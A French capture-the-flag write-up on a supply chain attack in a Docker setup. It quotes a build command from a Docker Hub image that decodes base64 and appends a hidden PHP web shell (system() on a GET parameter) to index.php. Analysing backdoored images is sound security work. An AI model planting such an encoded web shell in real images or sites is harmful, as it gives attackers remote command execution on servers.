# Write-up : Supply Chain Attack - Docker

## Le Contexte :

Le but de ce challenge était de trouver ce qu'il se passé dans l'environnement Docker qui nous était donné. Tout part d'un serveur web déployé avec plusieurs services Docker. L'idée était de repérer ce qui se tramais ici et récupérer un flag en trouvant une potentiel **"Supply Chain Attack"**.

## Explorer l'Environnement

Je commence par jeter un œil au fichier **docker-compose.yml**, qui liste les services Docker. On y trouve des trucs comme **Nginx**, **PHPMyAdmin**, **MySQL** et **Apache2**. Pas de flag visible, mais je remarque des services exposés (ports ouverts), ce qui me donne une piste pour chercher.

## Le Dockerfile de MySQL

Un coup d'œil rapide sur le **Dockerfile** utilisé pour **MySQL** montre quelques failles possibles (comme des mots de passe en dur), mais rien de vraiment décisif pour l'instant.

## Le service autoheal

J'ai regardé le service **autoheal** dans le fichier **docker-compose.yml** et, bien que sa fonction de redémarrage automatique des conteneurs puisse sembler suspecte, une inspection plus approfondie de l'image Docker n'a révélé aucune vulnérabilité ni comportement malveillant. Il ne semble donc pas y avoir de faille à exploiter ici.

## L'Image apachetwo/apache2_php:1.5 : **BINGO**

La vraie découverte arrive quand je regarde l'image **apachetwo/apache2_php:1.5** sur docker Hub. J'y trouve une ligne de commande qui m'interpelle :

~~~
/bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHdU5ESXYnKSk7Pz4.....=" | base64 -d) >> index.php
~~~


Bon là je me dis go **base64 --decode** cela me redonne une ligne à décoder et **BOOM**, le FLAG !!!
